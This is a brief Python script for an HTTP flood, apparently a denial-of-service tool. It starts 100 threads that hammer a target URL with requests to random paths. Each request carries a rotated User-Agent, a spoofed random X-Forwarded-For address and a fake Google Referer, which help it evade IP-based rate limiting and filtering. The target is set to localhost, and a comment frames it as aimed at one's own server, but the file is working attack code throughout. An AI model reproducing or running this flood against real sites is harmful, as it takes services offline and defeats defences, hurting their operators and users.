import threading
import requests
import random
import string
import time

TARGET_URL = "http://127.0.0.1"  # Apna server IP/Domain
THREADS = 100
REQUESTS_PER_THREAD = 50
DELAY = 0.001

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
]

def generate_random_path():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(5,15)))

def attack(thread_id):
    for i in range(REQUESTS_PER_THREAD):
        headers = {
            "User-Agent": random.choice(user_agents),
            "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4)),
            "Referer": f"https://google.com/{generate_random_path()}",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "no-cache",
            "Connection": "keep-alive"
        }
        try:
            r = requests.get(f"{TARGET_URL}/{generate_random_path()}", headers=headers, timeout=3)
            print(f"[Thread {thread_id}] Request {i+1} => {r.status_code}")
        except requests.RequestException as e:
            print(f"[Thread {thread_id}] Request {i+1} FAILED: {e}")
        time.sleep(DELAY)

def start_attack():
    threads = []
    for i in range(THREADS):
        t = threading.Thread(target=attack, args=(i,))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

if __name__ == "__main__":
    start_attack()
